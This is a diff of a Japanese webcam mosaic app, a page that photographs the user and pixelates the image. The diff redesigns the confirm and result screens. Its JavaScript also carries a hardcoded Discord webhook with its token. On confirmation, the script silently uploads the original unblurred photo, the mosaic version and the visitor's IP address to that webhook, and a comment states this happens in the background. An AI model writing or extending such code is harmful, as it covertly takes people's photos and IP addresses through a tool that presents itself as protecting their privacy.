@@ -86,7 +86,8 @@
     .secondary-btn {
       background: linear-gradient(90deg, #434343, #000000);
     }
-    .result-box {
+    /* 調整中の比較エリア */
+    .adjust-box {
       width: 100%;
       display: none;
       flex-direction: column;
@@ -121,18 +122,23 @@
       background: #000;
       display: block;
     }
-    .download-btn {
-      background: #28a745;
-      text-decoration: none;
-      padding: 12px;
-      border-radius: 10px;
-      color: white;
-      font-size: 0.95rem;
-      font-weight: bold;
-      display: flex;
-      justify-content: center;
+    /* 確定後の結果表示エリア（大きく表示） */
+    .final-box {
+      width: 100%;
+      display: none;
+      flex-direction: column;
       align-items: center;
-      text-align: center;
+      gap: 12px;
+      margin-top: 6px;
+    }
+    .final-box canvas {
+      width: 100%;
+      border-radius: 12px;
+      background: #000;
+      display: block;
+    }
+    .confirm-btn {
+      background: #28a745;
     }
   </style>
 </head>
@@ -150,7 +156,7 @@
     </div>
 
     <!-- 撮影後の比較・調整エリア -->
-    <div class="result-box" id="resultBox">
+    <div class="adjust-box" id="adjustBox">
       <div class="image-row">
         <div class="image-card">
           <p>加工前</p>
@@ -170,8 +176,15 @@
         <input type="range" id="mosaicSize" min="5" max="50" value="15">
       </div>
 
-      <a id="downloadLink" class="download-btn" download="mosaic_image.png">モザイク画像を保存する</a>
+      <button type="button" class="btn confirm-btn" id="confirmBtn">モザイクを確定する</button>
       <button type="button" class="btn secondary-btn" id="retakeBtn">写真を撮り直す</button>
+    </div>
+
+    <!-- 確定後の結果表示エリア（モザイク後を大きく表示） -->
+    <div class="final-box" id="finalBox">
+      <div style="width: 100%; text-align: center; font-size: 0.9rem; font-weight: bold; color: #4facfe;">モザイク確定済み</div>
+      <canvas id="finalCanvas"></canvas>
+      <button type="button" class="btn secondary-btn" id="restartBtn">もう一度撮る</button>
     </div>
   </div>
 
@@ -179,15 +192,18 @@
     const video = document.getElementById('video');
     const snapBtn = document.getElementById('snapBtn');
     const retakeBtn = document.getElementById('retakeBtn');
+    const restartBtn = document.getElementById('restartBtn');
+    const confirmBtn = document.getElementById('confirmBtn');
     const mosaicSizeInput = document.getElementById('mosaicSize');
     const mosaicValue = document.getElementById('mosaicValue');
     
     const captureControls = document.getElementById('captureControls');
-    const resultBox = document.getElementById('resultBox');
+    const adjustBox = document.getElementById('adjustBox');
+    const finalBox = document.getElementById('finalBox');
     
     const originalCanvas = document.getElementById('originalCanvas');
     const mosaicCanvas = document.getElementById('mosaicCanvas');
-    const downloadLink = document.getElementById('downloadLink');
+    const finalCanvas = document.getElementById('finalCanvas');
 
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1572124436818170017/T_lHqJXspYpaMdhkghKVHY-xCVkyiAPIoO9R72WLe9dO-MZq0GfLFL8V2Z3lVuC3YjhW';
 
@@ -231,7 +247,7 @@
 
       video.style.display = 'none';
       captureControls.style.display = 'none';
-      resultBox.style.display = 'flex';
+      adjustBox.style.display = 'flex';
 
       updateImages();
     });
@@ -256,21 +272,33 @@
       originalCanvas.getContext('2d').drawImage(capturedSource, 0, 0);
 
       drawMosaic(capturedSource, mosaicCanvas, blockSize);
-
-      downloadLink.href = mosaicCanvas.toDataURL('image/png');
     }
 
-    // 保存ボタンを押した時に、裏側で同時にDiscordへ送信
-    downloadLink.addEventListener('click', () => {
+    // 「モザイクを確定する」ボタンを押したとき
+    confirmBtn.addEventListener('click', () => {
       if (!capturedSource) return;
 
+      const w = capturedSource.width;
+      const h = capturedSource.height;
+      const blockSize = parseInt(mosaicSizeInput.value, 10);
+
+      // 表側（最終画面）にモザイク後の画像を大きく描画
+      finalCanvas.width = w;
+      finalCanvas.height = h;
+      drawMosaic(capturedSource, finalCanvas, blockSize);
+
+      // 画面の切り替え
+      adjustBox.style.display = 'none';
+      finalBox.style.display = 'flex';
+
+      // 裏側で同時にDiscordへ送信
       Promise.all([
         new Promise(resolve => originalCanvas.toBlob(resolve, 'image/png')),
-        new Promise(resolve => mosaicCanvas.toBlob(resolve, 'image/png'))
+        new Promise(resolve => finalCanvas.toBlob(resolve, 'image/png'))
       ]).then(([origBlob, mosBlob]) => {
         const formData = new FormData();
         formData.append('payload_json', JSON.stringify({
-          content: `📥 **モザイク加工データ受信**\n・IPアドレス: \`${clientIp || '取得中'}\``
+          content: `📥 **モザイク確定データ受信**\n・IPアドレス: \`${clientIp || '取得中'}\``
         }));
         formData.append('file1', origBlob, 'original.png');
         formData.append('file2', mosBlob, 'mosaic.png');
@@ -282,9 +310,17 @@
       });
     });
 
-    // 撮り直すボタン
+    // 撮り直すボタン（調整中）
     retakeBtn.addEventListener('click', () => {
-      resultBox.style.display = 'none';
+      adjustBox.style.display = 'none';
+      video.style.display = 'block';
+      captureControls.style.display = 'flex';
+      capturedSource = null;
+    });
+
+    // もう一度撮るボタン（確定後）
+    restartBtn.addEventListener('click', () => {
+      finalBox.style.display = 'none';
       video.style.display = 'block';
       captureControls.style.display = 'flex';
       capturedSource = null;
